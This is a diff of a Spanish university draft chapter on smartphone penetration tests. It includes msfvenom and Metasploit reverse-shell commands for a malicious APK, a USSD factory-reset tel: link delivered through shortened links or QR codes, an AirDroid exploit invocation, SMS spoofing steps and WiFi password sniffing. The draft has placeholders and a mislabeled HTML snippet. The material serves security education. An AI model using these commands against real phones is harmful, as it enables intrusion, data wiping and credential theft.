@@ -13,7 +13,7 @@ Por cada prueba, se explica como se usan las herramientas, demostrando su potenc
 A continuación, se enumerarán brevemente las pruebas principales.
 - Pentesting en Android: aspecto relativo a las pruebas de seguridad que se somete un sistema.
 - SMS Spoofing: aspecto relacionado a la red de celulares.
-- Vulnerabilidades con USSD: aspecto relativo a la tecnología de los celulares.
+- Vulnerabilidades con USSD: aspecto relativo a la tecnología de las telecomunicaciones.
 - Seguridad en apps: aspecto relacionado al software que manipulan los recursos del smartphone.
 - Sniffing por WiFi: aspecto relacionado a la red WiFi.
 - Desbloqueo en el acceso físico: aspecto relativo al sistema operativo.
@@ -34,22 +34,22 @@ Para la ejecución de las pruebas se utilizan 3 dispositivos: Motorola Defy+ (co
 
 Primero se parte de la definición de pentesting [PENTEST]:
 	"Una prueba de penetración (también llamada pentesting) es la práctica de probar un sistema de computadora, red o aplicación web para encontrar vulnerabilidades que un atacante puede explotar."
-Para probar una vulnerabilidad en Android, se usó una herramienta para realizar una prueba de penetración, la misma se denomina "Metasploit", ésta cuenta con la colaboración de la comunidad del software libre; existen otras herramientas que también permiten realizar pruebas en Android, como por ejemplo "Android Tamer". Hay cuatro versiones de "Metasploit" [METAVER], la versión que se va a utilizar se llama "Metasploit Framework", es la más usada y la más activa entre las cuatro versiones. Esta versión es Open Source y gratuita, es utilizada principalmente por los desarrolladores de exploits y expertos en seguridad; esta versión expone una interfase por línea de comandos, pero tiene la funcionalidad básica en comparación con la versión paga más cara ("Metasploit Pro") [METAFRA]. Esta herramienta es instalada por defecto cuando se instala el sistema operativo Kali Linux, con lo cual sólo se describirá su uso, no su instalación; con algunos de sus comandos se podrá realizar la prueba.
+Para probar una vulnerabilidad en Android, se usó una herramienta que sirve para realizar "pentesting", la misma se denomina "Metasploit", ésta cuenta con la colaboración de la comunidad del software libre; existen otras herramientas que también permiten realizar pruebas en Android, como por ejemplo "Android Tamer". Hay cuatro versiones de "Metasploit" [METAVER], la versión que se va a utilizar se llama "Metasploit Framework", es la más usada y la más activa entre las cuatro versiones. Esta versión es Open Source y gratuita, es utilizada principalmente por los desarrolladores de exploits y expertos en seguridad; esta versión expone una interfase por línea de comandos, pero tiene la funcionalidad básica en comparación con la versión paga más cara ("Metasploit Pro") [METAFRA]. Esta herramienta es instalada por defecto cuando se instala el sistema operativo Kali Linux, con lo cual sólo se describirá su uso, no su instalación; con algunos de sus comandos se podrá realizar la prueba.
 En esta primer prueba se pretende tener acceso a una herramienta profesional para comprobar la seguridad en Android, la prueba es sencilla y marca el inicio de la serie de demostraciones. A grandes rasgos, la serie de pasos que se sigue es la siguiente: primero se genera el exploit (con una serie de comandos), luego se transmite el exploit al smartphone de la víctima (con ingeniería social, por ejemplo), una vez que la víctima tiene incorporado el exploit, el autor de éste podrá acceder a cierta información privada contenida en el smartphone, de forma remota.
 
 4.4.1.2 Procedimiento
 
-Los pasos que se van a seguir se los pueden reunir en 2 grupos: la generación del exploit (en una PC) y la activación del exploit (en un smartphone); cada grupo de comandos se va a ejecutar en 2 consolas separadas. El primer grupo de comandos contribuyen en la generación de un archivo que contiene código malicioso (payload). El segundo grupo contribuyen en la ejecución del exploit en el smartphone víctima, que permite la conexión con la víctima cuando éste use el exploit.
+Los pasos que se van a seguir se los pueden reunir en 2 grupos: la generación del exploit (en una PC) y la activación del exploit (en un smartphone); cada grupo de comandos se va a ejecutar en 2 consolas separadas y en este orden. El primer grupo de comandos contribuyen en la generación de un archivo que contiene código malicioso (payload). El segundo grupo contribuyen en la ejecución del exploit en el smartphone víctima, que permite la conexión con la víctima cuando éste use el exploit.
 El archivo que se genera es un instalador de una aplicación Android (lleva la extensión .apk), el cual actúa como un exploit con el objetivo de ingresar al sistema víctima. Cuando se activa el exploit, se pueden ejecutar una serie de comandos para obtener información, como acceder al filesystem o acceder al log de llamadas hechas con el celular. Cuando se ejecuta el exploit desde el smartphone víctima, queda corriendo en segundo plano a la espera de órdenes de un host controlado por el atacante.
 
 CONSOLA 1
-El conjunto de comandos por consola (en modo superusuario) que se debe ejecutar es el siguiente:
+// En una consola y en modo superusuario se deben ejecutar los siguientes comandos:
 # ifconfig
 // Este comando retorna varios parámetros agrupados por interfase de red. En el grupo relativo a la conexión inalámbrica (wlan0), se obtiene la IP de la máquina actual (con el formato X.X.X.X) el cual nos sirve como parámetro para el próximo comando:
 # msfvenom -p android/meterpreter/reverse_tcp LHOST=X.X.X.X LPORT=8080 R > exploit.apk
 
 CONSOLA 2
-// Seguidamente se abre otra consola y se ejecuta esta serie de comandos:
+// En otra consola y en modo superusuario se deben ejecutar los siguientes comandos:
 msfconsole
 use multi/handler
 set payload android/meterpreter/reverse_tcp
@@ -61,7 +61,7 @@ meterpreter >
 
 4.4.1.3 Observaciones
 
-Este comando funcionó para el modelo tal y tal, pero no para tal ---
+Este comando funcionó para el modelo tal y tal, pero no para tal --- { REALIZAR PRUEBAS ADICIONALES }
 Cuando se activó el exploit y se ejecutaron comandos desde la PC, de forma remota, algunos de ellos no devolvían los resultados que se esperaban.
 En base a esta demostración, se obtuvieron las siguientes conclusiones. Se puede generar fácilmente un exploit que obtenga acceso (sin el consentimiento del usuario) a un smartphone. Por otro lado, esta técnica se puede mejorar con la ayuda de la ingeniería social, de forma tal que se puede inducir a un usuario (víctima) a instalar el exploit en su celular, para efectuar un acto criminal, por ejemplo. Finalmente, se aclara que esta prueba se aplica específicamente a Android.
 
@@ -69,63 +69,83 @@ En base a esta demostración, se obtuvieron las siguientes conclusiones. Se pued
 
 4.4.2.1 Introducción
 
-En el capítulo 1 se explicó la idea del SMS Spoofing. En la siguiente prueba se va a demostrar que esta idea es factible. Es una práctica que puede afectar a celulares, sin importar el sistema operativo que tengan instalados. Para lograr esta prueba se utiliza un servicio que ofrece una empresa llamada "DiGiMessaging", la cual permite el envío de SMSs desde la Web. En este caso, se va a utilizar la prueba gratuita.
+En el capítulo 1 (sección 1.5.4.4) ya se explicó la idea del SMS Spoofing. Ahora, en la siguiente prueba se va a demostrar que esta idea es factible. Es una práctica que puede afectar a cualquier celular, sin importar el sistema operativo que utilice. Para realizar esta prueba se emplea un servicio ofrecido por una empresa llamada "DiGiMessaging", la cual permite el envío de SMSs desde la Web, con un caller ID arbitrario. En este caso, se va a utilizar la prueba gratuita, la cual impone una restricción en el envío de SMSs: solo se pueden enviar 3 mensajes SMS por cuenta.
 
 4.4.2.2 Procedimiento
 
-Primero se debe registrar en el sitio web "http://www.digimessaging.com/", completando formularios con algunos datos personales. Luego, se debe dirigir al link que dice "FREE TRIAL", donde aparecerá un formulario con forma de celular. En los campos del formulario, completar: en el campo "From" se ingresa un nombre (por ejemplo, "UNLP"), en el campo "To" se selecciona el país Argentina y se ingresa un número de celular sin la característica del país (por ejemplo, "2215775754"); finalmente se apreta el botón "SEND".
-Luego de un pequeño lapso de tiempo, se recibirá un mensaje en el smartphone con el remitente que se definió en el campo "To".
+El primer paso es registrarse en el sitio web "http://www.digimessaging.com/", completando formularios con datos personales. Luego, se debe dirigir al link que dice "FREE TRIAL", donde aparecerá un formulario con forma de celular. Completar los campos del formulario de la siguiente manera: en el campo "From" se ingresa un nombre (por ejemplo, "UNLP"), en los 
+campos que corresponden a "To" se selecciona el país Argentina y se ingresa un número de celular sin la característica del país (por ejemplo, "2215775754"); finalmente se apreta el botón "SEND". Pasado un lapso de tiempo (alrededor de 1 minuto), se recibirá un mensaje en el smartphone con el remitente que se definió en el campo "To".
 
 4.4.2.4 Observaciones
 
-Con esta prueba se demostró que la aplicación del SMS Spoofing es factible y sencillo (con la inclusión de interfases amigables). No exige conocimientos técnicos, si se terceriza el trabajo a alguna de las tantas empresas que ofrecen este tipo de servicio, o sea, las empresas (como por ejemplo, "BulkSMS") que ofrecen el servicio del envío de múltiples SMSs a celulares de cualquier parte del mundo, con un "caller ID" o "sender ID" arbitrario.
-En el caso concreto de esta prueba, se la puede mejorar comprando saldo o créditos para poder enviar mensajes con un texto arbitrario en el cuerpo del mensaje. Con otras empresas pasa lo mismo, si se paga un arancel se puede conseguir mas características.
+Con esta prueba se demostró que la aplicación del SMS Spoofing es factible (con la inclusión de interfases amigables) y simple. En este caso, se tercerizó el trabajo a alguna de las tantas empresas que ofrecen este tipo de servicio (otro ejemplo es "BulkSMS"): envío de múltiples SMSs a celulares de cualquier parte del mundo, con un "caller ID" o "sender ID" arbitrario. Por lo tanto, esta prueba no exigió conocimientos técnicos específicos, dado que el trabajo se delegó a un tercero. En el caso de la empresa elegida, su aplicación tiene una restricción de seguridad, no se pueden enviar SMSs con un remitente de una entidad conocida, como un banco; es decir, tiene como listas negras para el remitente.
+Esta prueba puede mejorarse, adquiriendo saldo o créditos para poder enviar mas de 3 mensajes. Con otras empresas pasa lo mismo, si se paga un arancel se pueden conseguir mas características.
 
 4.4.3 Tercer prueba
 
 4.4.3.1 Introducción
 
-En el capítulo anterior se explicó la idea de USSD que son códigos especiales que se comunican con una capa más baja que la del sistema operativo, acá se toca otro aspecto que involucra a la tecnología del dispositivo. La siguiente prueba consiste en su uso para aprovechar una vulnerabilidad: comando USSD que reestablece el estado del dispositivo al estado de fábrica (produciendo una pérdida de datos) o puede llegar a dejar en un estado obsoleto al chip SIM, ésta explotación de la vulnerabilidad puede tener efecto en los celulares Samsung hasta la versión S3 y también los smartphones Motorola Defy+, como también en otros.
+En esta prueba se toca un aspecto relativo a las telecomunicaciones en los celulares en general. Esta prueba afectaba a cualquier sistema operativo móvil dado que se ejecutan comandos para comunicarse con el proveedor de telefonía móvil. Para ejecutar estos comandos, se utilizan los códigos USSD.
+La idea de USSD (Unstructured Supplementary Service Data - Servicio suplementario de datos no estructurados) es de proveer códigos especiales para marcar en un smartphone (o cualquier celular) y comunicarse con un programa dentro de la red de celulares [TECUSSD] para llevar acciones a cabo. Es una tecnología vieja heredada de las antiguas redes de telefonía, pero aún está activa y puede ser usada.
+La prueba consiste en usar esta forma de comunicación para destruir datos, demostrando que se la puede usar con fines maliciosos. Se usa un comando USSD que reestablece al estado de fábrica a un smartphone (produciendo una pérdida de datos) y/o puede llegar a dejar en un estado obsoleto al chip SIM, esta explotación de la vulnerabilidad puede tener efecto en los celulares Samsung hasta la versión S3 y también los smartphones Motorola Defy+, como también en otros modelos. Esta vulnerabilidad fue expuesta públicamente en la conferencia de seguridad llamada "Ekoparty" en el año 2012 [COMPMOV].
+Antes de explotar la vulnerabilidad, se puede comprobar si la explotación va a ser exitosa con una pequeña prueba. Previo a la explotación se describirá esta pequeña prueba previa. Antes de describir la prueba que explota la vulnerabilidad, se va a comentar un método que sirve para comprobar si se puede dañar al smartphone que se va a someter. Este método es sencillo,
+Sin embargo, la vulnerabilidad ya fue controlada, los dispositivos actuales no cuentan con este tipo de riesgos, evitan la ejecución de este tipo de comandos peligrosos. Para los smartphones que aún posean la vulnerabilidad, se puede instalar una app de un tercero.
+
+[TECUSSD] [http://searchnetworking.techtarget.com/definition/USSD]
+[COMPMOV] [http://computacionmovil-ar.blogspot.com.ar/2012/09/explicacion-de-la-vulnerabilidad-de.html]
 
 4.4.3.2 Procedimiento
 
-Antes de describir la prueba que explota la vulnerabilidad, se va a comentar un método para comprobar si ésta tiene efecto a un equipo en particular (el nuestro, por ejemplo). Este método es sencillo, consta de hacer click en un link y comprobar si devuelve el número IMEI; si es así, entonces el equipo es susceptible a este tipo de ataques.
+La prueba para saber si un smartphone es susceptible a esta vulnerabilidad consta de hacer click en un link y verificar si devuelve el número IMEI; si es así, entonces el equipo es susceptible a este tipo de ataques.
 (se puede mostrar una página estática con un link <a> que apunte a "tel:*#06#").
+Código html:
+<a href="tel:*%2306%23" target="_blank">IMEI</a>
+
 Ahora, para notar los efectos de esta explotación se puede usar el siguiente vector de ataque: un link recortado, el cual oculta su contenido original y quizás aparenta ser inofensivo (si aplicamos un poco de ingeniería social).
 (La prueba consiste en el acceso a un link que apunte a la siguiente dirección "tel:*2767*3855#".)
+Código html:
+<a href="tel:*%2306%23" target="_blank">IMEI</a>
 (se podría pegar un papel con un QR Code en el pasillo de la Facultad sin ninguna descripción ni texto que describa a donde lo dirige para tener una idea de la tendencia de la gente hacia el uso del QR Code desconociendo su destino, a dónde lo van a llevar; ese QR Code podría apuntar a la página de la Facultad).
-Fuente:
-http://computacionmovil-ar.blogspot.com.ar/2012/09/explicacion-de-la-vulnerabilidad-de.html
 
 4.4.3.3 Observaciones
 
-Esta prueba expone una vulnerabilidad que es explotada fácilmente, la cual afecta a algunos equipos relativamente viejos. Sin embargo, ésto nos demuestra que existen vectores de ataque que usan medios como los links QR, links recortados que suelen emplearse en twitter, links enviados por sms, etc. y nada nos asegura que no puedan seguir surgiendo explotaciones que utilicen los mismos vectores de ataque, con lo cual es sería más sencillo que el usuario preste atención frente a este tipo de contenido. Cabe destacar que esta vulnerabilidad fue expuesta en la conferencia de seguridad "Ekoparty", en el año 2012.
+Esta prueba expone una vulnerabilidad que es explotada fácilmente, la cual afecta a algunos equipos relativamente viejos. Sin embargo, ésto nos demuestra que existen vectores de ataque que usan medios como los links QR, links recortados que suelen emplearse en twitter, links enviados por sms, etc. y nada nos asegura que no puedan seguir surgiendo explotaciones que utilicen los mismos vectores de ataque, con lo cual es sería más sencillo que el usuario preste atención frente a este tipo de contenido.
+[SE PUEDE PROFUNDIZAR ... HABLANDO TODO ACERCA DEL TAG "TEL"]
 
 4.4.4 Cuarta prueba [ COMPLETAR!!! ]
 
 4.4.4.1 Introducción
 
-La siguiente prueba consiste en demostrar otro aspecto: la seguridad en las apps. Específicamente, se expone una vulnerabilidad de la app llamada "AirDroid". Ésta es aprovechada por un "exploit" (un "script" escrito en "python") registrado en un registro público de "exploits" llamado "Exploit Database" [EXPLODB]. Dado que esta vulnerabilidad fue resuelta y se publicó una actualización con el parche incorporado, entonces para que funcione esta demostración se necesita instalar una versión anterior a la que se le aplicó el parche. En este caso se va a usar la versión 3.1.3 que se la puede adquirir desde un repositorio alternativo llamado "Apk 4 Fun" [APKFFUN], dado que en Google Play está la versión más reciente.
-Dada una red local en la cual estan conectados 3 equipos, un smartphone y 2 PCs, en la cual el smartphone y la PC comparten datos por medio de la app "AirDroid". Ahora, la ejecución del "exploit" mencionado permite la subida de archivos al smartphone (sin su concentimiento) por parte de una PC que está en la misma red local y no está autenticada por la app "AirDroid", ni tampoco tiene instalada la app.
+Las distintas apps que se pueden adquirir desde los diversos medios de distribución pueden contener bugs de seguridad, que pueden ser explotados para obtener privilegios en el acceso al sistema operativo. Las apps legítimas y benignas que no se comportan como software malicioso, pueden incluir bugs. Esta prueba consiste en demostrar otro aspecto vulnerable del sistema Android: la seguridad en las apps.
+Concretamente, en base a una app llamada "AirDroid", se expone una vulnerabilidad propia de esta app que es aprovechada por un "exploit", en este caso es un "script" escrito en "python". Este "exploit" fue obtenido de un registro público de "exploits" llamado "Exploit Database" [EXPLODB]. Esta vulnerabilidad fue resuelta, o sea que ya se publicó una actualización que corrige este bug. Entonces para que funcione esta demostración, se requiere adquirir e instalar una versión anterior a la versión que ya contiene la corrección; para lograrlo, se puede acudir a un repositorio alternativo llamado "Apk 4 Fun" [APKFFUN] que tiene un historial de versiones de varias apps, junto con los paquetes instaladores, el marketplace oficial Google Play está descartado porque tiene la versión más reciente. En este caso se va a usar la versión 3.1.3, dado que a partir de la versión 3.1.4, este bug ya está corregido [AIRFORU].
+Este exploit permite que PCs que se encuentren en la misma red puedan subir archivos a un dispositivo, sin estar autenticados mediante la app. En el marco de esta prueba, se tienen los siguientes elementos: una red local en la cual está conectado un smartphone y 2 PCs. En el entorno concreto de esta prueba se usa: una notebook con "Windows 7" que usa AirDroid desde la web, un smartphone "LG G3" con Android 5.0.2 ("Lollipop") que lleva instalada la app AirDroid, y la máquina atacante es una notebook con Kali Linux que lleva la versión 2.7 de Python. La interacción entre ellos sucede de esta forma: el smartphone y la PC comparten datos por medio de la app "AirDroid", normalmente; desde otra PC en la misma red local, se pueden subir archivos al smartphone de forma inadvertida y sin estar autenticado en el ámbito de "AirDroid", gracias a la ayuda del "exploit".
 
+[AIRFORU] [http://forums.airdroid.com/viewtopic.php?f=6&t=15870]
 [EXPLODB] [https://www.exploit-db.com/exploits/37504/]
 [APKFFUN] [http://www.apk4fun.com/apk/56479/]
 
 4.4.4.2 Procedimiento
 
-Primero, en una PC se debe crear una cuenta de AirDroid e iniciar sesión desde el sitio web de AirDroid (https://www.airdroid.com/) desde una PC de escritorio.
-Segundo, se debe descargar e instalar en el smartphone, la versión 3.1.3 de la app AirDroid a partir del repositorio "Apk 4 Fun".
-Tercero, se debe ejecutar el script que explota la vulnerabilidad desde otra PC de escritorio, preferentemente con Linux, dado que el script corre en el intérprete de python el cual se encuentra en la mayoría de las distribuciones de Linux. Los parámetros más importantes de este script son los siguientes: IP y puerto del smartphone víctima, nombre del archivo a enviar y ubicación del archivo dentro del filesystem de la víctima. Un ejemplo del uso del comando sería:
+En primera instancia, por un lado, en una PC se debe crear una cuenta de AirDroid e iniciar sesión con esa misma cuenta desde el sitio web de AirDroid (https://www.airdroid.com/), y por el otro lado, en el smartphone se debe descargar e instalar la versión 3.1.3 de la app AirDroid a partir del repositorio llamado "Apk 4 Fun". En esta parte, se determinó un entorno normal de trabajo para el usuario.
+Luego, desde la PC que tiene Linux, se debe ejecutar el script que explota la vulnerabilidad. Los parámetros más importantes de este script son: IP y puerto del smartphone víctima, nombre del archivo a enviar y ubicación del archivo dentro del filesystem de la víctima. Un ejemplo del uso del comando sería:
 $ python exploit.py 192.168.0.43 8888 prueba.txt prueba.txt /sdcard
-En donde, el segundo parámetro es la dirección IP de la víctima, el tercer puerto es el puerto de la víctima, el quinto parámetro es el nombre del archivo que va a tener en el smartphone, el sexto parámetro define cuál es el archivo local que se va a depositar en la víctima, el séptimo parámetro es la ubicación del archivo.
-En el caso concreto de la prueba que se realizó, se usó AirDroid desde la web en una notebook con "Windows 7", y en el otro extremo, se usó un smartphone "LG G3" con Android 5.0.2 ("Lollipop") que lleva instalada la app AirDroid. Existe un tercer componente en esta red local que tiene el rol de atacante, una notebook con Kali Linux que tiene "python" (versión 2.7).
+En donde, el primer parámetro es el nombre del archivo que se comporta como exploit, el segundo y tercer parámetro es la dirección IP y el puerto de la víctima, respectivamente, el cuarto parámetro es el nombre que se le va a asignar al archivo transferido, el quinto parámetro define el nombre del archivo local que se va a transferir, el sexto parámetro es la ubicación en el smartphone (donde se va a depositar al archivo).
+
+4.4.4.3 Observaciones
+
+En esta prueba se consiguió infiltrar archivos en un smartphone, sin el consentimiento del usuario y sin que lo perciba, mediante una app. No se analizó la implementación del exploit, sino los resultados de su aplicación.
 
 4.4.5 Quinta prueba [ COMPLETAR!!! ]
 
 4.4.5.1 Introducción
 
-Los smartphones actuales pueden conectarse a una red WiFi, pero la incorporación de esta tecnología les permite a los hackers atacar al smartphone empleando técnicas conocidas y probadas en las computadoras de escritorio.
-Concretamente, en esta prueba se intenta demostrar que se pueden capturar paquetes sin el consentimiento del usuario (sniffing) que entran y salen de un smartphone que está conectado a una red Wifi. Para ello se utilizan 2 herramientas: "Ettercap" y "Wireshark" que corresponden a las 2 etapas de esta prueba. En una primer etapa se configurará una PC atacante de forma tal que pueda interceptar los paquetes que se transmitan entre un router y un smartphone. En una segunda etapa, se estudiarán los paquetes que intercepta el host atacante. El objetivo es exhibir que se pueden capturar paquetes con intensiones maliciosas, como por ejemplo, el robo de una contraseña de una cuenta de usuario. Este último ejemplo se va a probar al final.
+Los smartphones actuales pueden conectarse a una red WiFi, sin embargo la incorporación de esta tecnología permite capturar información del smartphone empleando técnicas conocidas y probadas en las PCs, como sniffing.
+En esta prueba se demuestra que se puede monitorear el tráfico que entra y sale de un smartphone que está conectado a una red WiFi, sin el consentimiento del usuario. Para ello se utilizan 2 herramientas: "Ettercap" y "Wireshark" que corresponden a 2 etapas de esta prueba.
+
+Ettercap sirve para [REFERENCIA].
+Wireshark sirve para [REFERENCIA].
+
+En la primer etapa, se configurará una PC atacante para que pueda interceptar los paquetes que se transmitan entre un router y un smartphone. En la segunda etapa, se estudiarán los paquetes que intercepta el host atacante. El objetivo es exhibir que se pueden capturar paquetes con intensiones maliciosas, como por ejemplo, el robo de una contraseña de una cuenta de usuario. Este último ejemplo se va a probar al final.
 
 4.4.5.2 Procedimiento
 
@@ -162,7 +182,7 @@ Otros vectores de ataque:
 https://en.wikipedia.org/wiki/DNS_hijacking
 https://en.wikipedia.org/wiki/ARP_spoofing
 
-4.4.5.3 Comentarios y observaciones
+4.4.5.3 Observaciones
 
 En este caso, se puede realizar un ataque del tipo "man-in-the-middle" porque los datos de la cuenta (usuario y contraseña) no estan encriptados. En el caso de que el sitio web utilice una encriptación, como lo hace "GMail" por ejemplo, no se pueden ubicar los datos de los campos que interesan para este caso. La primer etapa se la realiza de forma mécanica, o sea, casi siempre se va a realizar lo mismo; en cambio, la segunda puede requerir un poco de análisis.
 
@@ -170,7 +190,7 @@ En este caso, se puede realizar un ataque del tipo "man-in-the-middle" porque lo
 
 4.4.6.1 Introducción
 
-El tamaño y peso del smartphone lo hace portable para que el usuario pueda llevarlo consigo a cualquier lugar, así puede realizar sus tareas en cualquier momento. Sin embargo, ésto lo expone a riesgos, dado que el smartphone puede estar al alcance de otra persona que tiene malas intenciones.
+El tamaño y peso del smartphone lo hacen portable para que el usuario pueda llevarlo consigo a cualquier lugar, así puede realizar sus tareas en cualquier momento. Sin embargo, ésto lo expone a riesgos, dado que el smartphone puede estar al alcance de otra persona con malas intenciones.
 Ésto se va a demostrar a continuación, dado que existen formas de acceder a la información contenida en el smartphone, eludiendo las medidas de seguridad, como el bloqueo de la pantalla.
 En esta sección se realizan 2 pruebas: por un lado existe la posibilidad de forzar al smartphone a volver al estado de fábrica ("hard reset") para poder volver a usar el smartphone y ver lo que contiene la tarjeta SD; por otro lado, se puede aprovechar las facilidades que brinda Android para el desarrollo de apps de forma maliciosa. Es decir, cuando se conecta el smartphone a la PC y el mismo esta en "modo desarrollo", se puede tener acceso al filesystem del smartphone por la línea de comandos.
 Previo a la realización de las pruebas, por precaución se deben extraer la tarjetas SIM (por si queda inhabilitada) y la tarjeta de memoria SD (para no perder datos).
@@ -235,7 +255,7 @@ http://whiteboard.ping.se/Android/Rooting
 
 La forma en que se realizó el rooteo es muy sencillo. No obstante, se corren riesgos dado que la fuente de donde se consiguió el exploit no es confiable. Se podría haber ejecutado el exploit en un entorno Linux.
 
-4.4.8 Octava prueba
+4.4.8 Octava prueba [COMPLETAR!!!]
 
 Malware
 
